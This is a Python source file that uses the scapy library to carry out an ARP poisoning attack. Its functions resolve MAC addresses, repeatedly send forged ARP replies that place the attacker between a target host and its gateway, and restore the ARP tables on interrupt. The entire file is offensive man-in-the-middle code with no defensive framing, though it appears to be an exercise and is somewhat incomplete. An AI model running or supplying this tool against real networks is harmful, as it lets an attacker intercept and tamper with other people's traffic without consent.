import signal
import sys
import os
import threading
from scapy.all import *


def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    print('restoreing target...')
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst='ff.ff.ff.ff.ff.ff', hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst='ff.ff.ff.ff.ff.ff', hwsrc=target_mac), count=5)
    os.kill(os.getpid(), signal.SIGINT)


def get_mac(ip_address):
    responses, unanswered = srp(Ether(dst='ff.ff.ff.ff.ff.ff')/ARP(pdst=ip_address), timeout=2, retry=10)

    for s, r in responses:
        return r[Ether].src

    return None


def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print('beginning the ARP poisin. ')
    while 1:
        try:
            send(poison_target)
            send(poison_gateway)

            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    print('ARP poison attack end.')
    return 0
